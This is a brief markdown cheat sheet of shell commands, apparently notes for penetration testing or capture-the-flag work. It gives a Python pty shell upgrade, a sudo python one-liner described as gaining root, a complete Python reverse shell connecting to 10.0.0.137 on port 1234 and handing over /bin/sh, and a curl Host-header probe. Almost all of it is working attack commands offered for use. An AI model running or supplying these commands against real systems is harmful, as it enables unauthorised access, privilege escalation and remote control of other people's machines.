# Python Shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
#used to gain root access in some systems.
```
sudo python3.5 -c ‘import os; os.system(“/bin/sh”)’
```
#command used to open up a reverse shell from the browser.
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.137",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
```
#can be used to find real host name.
```
curl -H 'Host: http://172.16.226.6' "http://172.16.226.6/'"
```